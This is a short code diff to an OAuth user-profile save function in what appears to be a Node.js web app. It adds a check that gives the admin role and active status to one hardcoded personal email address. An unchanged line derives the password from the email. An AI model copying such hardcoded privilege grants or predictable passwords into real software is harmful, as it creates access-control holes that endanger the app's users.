@@ -163,6 +163,11 @@ exports.saveOAuthUserProfile = function(req, providerUserProfile, done) {
 							password: providerUserProfile.email + '@token'
 						});
 
+						if (user.email == 'marcos.tomazini@gmail.com') {
+							user.ativo = true;
+							user.roles = ['admin', 'mobile'];
+						}
+
 						// And save the user
 						user.save(function(err) {
 							return done(err, user);
